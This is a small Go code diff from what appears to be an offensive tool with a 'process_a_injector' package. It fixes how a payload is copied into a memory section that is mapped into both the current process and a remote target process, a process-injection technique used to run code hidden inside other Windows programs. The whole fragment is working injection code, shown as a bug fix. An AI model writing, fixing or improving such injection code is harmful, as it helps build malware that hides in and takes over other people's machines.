@@ -5,12 +5,12 @@ import (
 	e "RaGodahn/pe"
 	a "RaGodahn/process_a_injector"
 	p "RaGodahn/pslistwin"
-	"encoding/binary"
 	"flag"
 	"fmt"
 	"os"
 	"slices"
 	"syscall"
+	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
@@ -66,11 +66,8 @@ func PE(path string) {
 	localBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, curHandle, size, 0)
 
 	fmt.Printf("mapViewOfSection réussie \n")
-	for i := 0; i < 8-len(payload); i++ {
-		payload = append([]byte{0x0, 0x0}, payload...) // for not to get index out of range
-	}
-	ptr := binary.BigEndian.Uint64(payload)
-	e.Memcpy(localBaseAddr, uintptr(ptr), len(payload))
+
+	e.Memcpy(localBaseAddr, unsafe.Pointer(&payload[0]), len(payload))
 
 	remoteBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, procHandle, size, 0)
 	fmt.Printf("localBaseAddr: %x \nremoteBaseAddr: %x\n", localBaseAddr, remoteBaseAddr)
